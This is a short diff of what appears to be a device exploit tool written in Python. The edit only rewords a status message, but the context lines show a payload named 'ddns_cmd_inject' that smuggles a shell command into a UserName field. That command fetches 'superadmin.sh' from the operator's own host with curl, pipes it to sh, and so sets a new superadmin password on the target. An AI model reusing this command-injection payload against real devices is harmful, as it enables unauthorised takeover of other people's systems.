@@ -150,7 +150,7 @@ if(session[0]):
                    print("Settings cleanup ok")
                 input("Done!")
             case '4':
-                print("Setting new superadmin account...")
+                print("Setting new superadmin password...")
                 payload = ddns_cmd_inject
                 payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/superadmin.sh | sh;"
 
